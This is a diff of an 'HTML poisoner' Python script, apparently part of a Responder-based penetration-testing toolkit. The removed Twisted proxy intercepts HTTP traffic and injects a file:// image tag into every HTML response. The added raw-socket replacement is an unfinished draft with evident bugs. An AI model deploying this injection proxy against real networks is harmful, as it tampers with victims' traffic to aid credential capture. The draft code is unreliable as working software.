@@ -1,173 +1,141 @@
 #!/usr/bin/env python
-#
-# This file is part of the Responder project which was originally written
-# by Laurent Gaffie - Trustwave Holdings, the code in this file is based upon
-# a Transparent HTTP proxy written by Erik Johansson and can be found at:
-# https://github.com/erijo/transparent-proxy
-#
-# This poisoner has been converted for purpose, brought together with other
-# peoples code and generally faffed around with by Felix Ryan.
-#
-# This program is free software: you can redistribute it and/or modify
-# it under the terms of the GNU General Public License as published by
-# the Free Software Foundation, either version 3 of the License, or
-# (at your option) any later version.
-#
-# This program is distributed in the hope that it will be useful,
-# but WITHOUT ANY WARRANTY; without even the implied warranty of
-# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
-# GNU General Public License for more details.
-#
-# You should have received a copy of the GNU General Public License
-# along with this program.  If not, see <http://www.gnu.org/licenses/>.
 
-TESTING = True
+HOST = "0.0.0.0"
+PORT = 3128
 VERBOSE = True
+TESTING = True
+MAX_CONN = 5
+BUFFER_SIZE = 4096
 
-from twisted.web import http
-from twisted.internet import reactor, protocol
-from utils import color
+TESTING_FILE_clientreq = 'HTMLpoisoner.clientreq.raw'
+TESTING_FILE_clientres = 'HTMLpoisoner.clientres.raw'
+TESTING_FILE_serverreq = 'HTMLpoisoner.serverreq.raw'
+TESTING_FILE_serverres = 'HTMLpoisoner.serverres.raw'
 
-class ProxyClient(http.HTTPClient):
-    """ The proxy client connects to the real server, fetches the resource and
-    sends it back to the original client, possibly in a slightly different
-    form.
-    """
+import socket, sys
+from thread import *
+import os
 
-    def __init__(self, method, uri, postData, headers, originalRequest):
-        self.method = method
-        self.uri = uri
-        self.postData = postData
-        self.headers = headers
-        self.originalRequest = originalRequest
-        self.contentLength = None
+def acceptConnection(connection):
+    data = connection.recv(BUFFER_SIZE)
+    if TESTING:
+        print str(len(data))+" bytes received"
+    return str(data)
 
-    def sendRequest(self):
-        if VERBOSE:
-            print color("[-] ", 1, 1) + "Sending request: %s %s" % (self.method, self.uri)
-        self.sendCommand(self.method, self.uri)
-
-    def sendHeaders(self):
-        for key, values in self.headers:
-            if key.lower() == 'connection':
-                values = ['close']
-            elif key.lower() == 'keep-alive':
-                next
-
-            if key.lower() == 'accept-encoding':
-                values = ['none']
-
-            for value in values:
-                self.sendHeader(key, value)
-        self.endHeaders()
-
-    def sendPostData(self):
-        if VERBOSE:
-            print color("[-] ", 1, 1) + "Sending POST data"
-        self.transport.write(self.postData)
-
-    def connectionMade(self):
-        if VERBOSE:
-            print color("[-] ", 1, 1) + "HTTP connection made"
-        self.sendRequest()
-        self.sendHeaders()
-        if self.method == 'POST':
-            self.sendPostData()
-
-    def handleStatus(self, version, code, message):
-        if VERBOSE:
-            print color("[-] ", 1, 1) + "Got server response: %s %s %s" % (version, code, message)
-        self.originalRequest.setResponseCode(int(code), message)
-
-    def handleHeader(self, key, value):
-        if key.lower() == 'content-length':
-            self.contentLength = value
-        else:
-            self.originalRequest.responseHeaders.addRawHeader(key, value)
-
-    def handleResponse(self, data):
-        data = self.originalRequest.processResponse(data)
-        data = data.replace('</body>', '<img src="file://htmlinject/random.jpg" alt="" /></body>')
-        if VERBOSE:
-            print color("[+] ", 1, 1) + "HTML poisoning performed"
-        if TESTING:
-            self.writeRawData(data, "testfile.bin")
-        if self.contentLength != None:
-            self.originalRequest.setHeader('Content-Length', len(data))
-
-        self.originalRequest.write(data)
-
-        self.originalRequest.finish()
-        self.transport.loseConnection()
-
-    def writeRawData(self, data, filename):
-        if TESTING:
-            print color("[-] ", 1, 1) + "Attempting to write raw data to disk (" + filename + ") for testing purposes"
-        outputFile = open(filename, "ab")
-        outputFile.write(data)
-        outputFile.close()
+def cleanup():
+    try:  # delete the smb.bin file if it exists - this is used for raw connection testing
+        os.remove(TESTING_FILE_clientreq)
+        os.remove(TESTING_FILE_clientres)
+        os.remove(TESTING_FILE_serverreq)
+        os.remove(TESTING_FILE_serverres)
+    except:
+        pass
 
 
-class ProxyClientFactory(protocol.ClientFactory):
-    def __init__(self, method, uri, postData, headers, originalRequest):
-        self.protocol = ProxyClient
-        self.method = method
-        self.uri = uri
-        self.postData = postData
-        self.headers = headers
-        self.originalRequest = originalRequest
-
-    def buildProtocol(self, addr):
-        return self.protocol(self.method, self.uri, self.postData,
-                             self.headers, self.originalRequest)
-
-    def clientConnectionFailed(self, connector, reason):
-        if VERBOSE:
-            print color("[-] ", 1, 1) + "Server connection failed: %s" % reason
-        self.originalRequest.setResponseCode(504)
-        self.originalRequest.finish()
-
-
-class ProxyRequest(http.Request):
-    def __init__(self, channel, queued, reactor=reactor):
-        http.Request.__init__(self, channel, queued)
-        self.reactor = reactor
-
-    def process(self):
-        host = self.getHeader('host')
-        if not host:
-            self.setResponseCode(400)
-            self.finish()
-            if VERBOSE:
-                print color("[-] ", 1, 1) + "No host header given"
-            return
-
+def getConnectionString(HeaderOne):
+    method = HeaderOne.split(' ')[0]
+    transport = HeaderOne.split(' ')[1].split('://')[0]
+    try:
+        hostAndPort = HeaderOne.split(' ')[1].split('://')[1].split('/', 1)[0]
+        host = hostAndPort.split(':')[0]
+        port = hostAndPort.split(':')[1]
+    except IndexError:
+        host = HeaderOne.split(' ')[1].split('://')[1].split('/',1)[0]
         port = 80
-        if ':' in host:
-            host, port = host.split(':')
-            port = int(port)
+    URI = '/' + HeaderOne.split(' ')[1].split('://')[1].split('/',1)[1]
+    connString = {'method' : method, 'transport' : transport, 'host' : host, 'port' : port, 'URI' : URI}
+    return connString
 
-        self.setHost(host, port)
+def connectionHandler(connection,data,address):
+    HTTPHeaders = getHeaders(data)
+    if TESTING:
+        print HTTPHeaders
+    # if HTTPHeaders is not a dictionary, it probably isn't an HTTP request so send the banner
+    if HTTPHeaders == False:
+        sendBanner(connection)
+    connectionString = getConnectionString(HTTPHeaders[0])
+    realWebSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    realWebSocket.connect((connectionString['host'],connectionString['port']))
+    realWebSocket.send(data)
+    #carry on from here
 
-        self.content.seek(0, 0)
-        postData = self.content.read()
-        factory = ProxyClientFactory(self.method, self.uri, postData,
-                                     self.requestHeaders.getAllRawHeaders(),
-                                     self)
-        self.reactor.connectTCP(host, port, factory)
+def createSocketListener(host, port):
+    try:
+        ServerSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        ServerSocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) #attempt to avoid socket lock problems
+        if VERBOSE:
+            print "Socket build complete ("+host+":"+str(port)+")"
+    except socket.error as errMsg:
+        print "[!] Failed to build socket ("+host+":"+str(port)+")\n" + str(errMsg)
+        sys.exit(2)
+    try:
+        ServerSocket.bind((host, port))
+        ServerSocket.listen(MAX_CONN)
+        if VERBOSE:
+            print "Socket bind complete ("+host+":"+str(port)+")"
+    except socket.error as errMsg:
+        print "[!] Failed to bind socket ("+host+":"+str(port)+")\n" + str(errMsg)
+        sys.exit(2)
+    return ServerSocket
 
-    def processResponse(self, data):
-        return data
+def getHeaders(reqData):
+    #Split out the data section from the headers / preamble
+    HTTPData = reqData.split("\r\n\r\n", 1)
+    #Split each line
+    HTTPHeadersList = HTTPData[0].split("\r\n")
+    try:
+        # First line is the HTTP method and request
+        HTTPHeadersDict = {HTTPHeadersList[0].split(' ', 1)[0] : HTTPHeadersList[0].split(' ', 1)[1]}
+        #The rest are colon separated headers and can be turned into a dictionary
+        headerIndex = 0
+        for header in HTTPHeadersList:
+            if headerIndex > 0:
+                headerParts = header.split(":", 1)
+                HTTPHeadersDict[headerParts[0]] = headerParts[1]
+            headerIndex += 1
+        if TESTING:
+            print HTTPHeadersDict
+        return HTTPHeadersDict
+    except IndexError:
+        return False
 
+def sendBanner(connection):
+    connection.send("The HTML Poisoner at your service ma'am...")
+    if TESTING:
+        print "Banner sent"
 
-class TransparentProxy(http.HTTPChannel):
-    requestFactory = ProxyRequest
+def writeRawData(data, filename):
+    if VERBOSE:
+        print "Attempting to write raw data to disk ("+filename+") for testing purposes"
+    outputFile = open(filename, "ab")
+    outputFile.write(data)
+    outputFile.close()
 
-
-class ProxyFactory(http.HTTPFactory):
-    protocol = TransparentProxy
-
-
+#get the thing up and running
 def main():
-    reactor.listenTCP(3128, ProxyFactory())
-    reactor.run()
+    if TESTING:
+        cleanup() #make sure no previous raw file captures are present
+    PoisonSocket = createSocketListener(HOST, PORT)
+
+    #always try and keep a socket open
+    while True:
+        connection, address = PoisonSocket.accept()
+        data = acceptConnection(connection)
+        if TESTING:
+            writeRawData(data, TESTING_FILE_clientreq)
+        if VERBOSE:
+            print "Connection from: " + address[0] + ":" + str(address[1])
+        #when new connections are received, spawn a new thread to handle it
+        start_new_thread(connectionHandler, (connection,data,address))
+    PoisonSocket.close
+
+if __name__ == '__main__':
+    try:
+        main()
+    #attempt, though don't hold your breath, to shutdown gracefully when told to do so
+    except KeyboardInterrupt:
+        print 'User signaled exit...'
+        try:
+            sys.exit(0)
+        except SystemExit:
+            os._exit(0)
